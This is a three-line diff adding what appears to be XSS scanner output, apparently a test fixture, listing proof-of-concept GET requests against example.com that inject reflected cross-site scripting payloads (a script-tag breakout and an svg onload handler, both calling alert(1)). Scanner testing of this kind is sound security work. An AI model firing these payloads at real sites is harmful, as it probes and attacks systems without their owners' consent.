@@ -1,0 +1,3 @@
+[*] Valid target found: https://example.com/?q=test
+[POC][V][GET] https://example.com/?q="><script>alert(1)</script>
+[POC][G][GET] https://example.com/?q=<svg/onload=alert(1)>
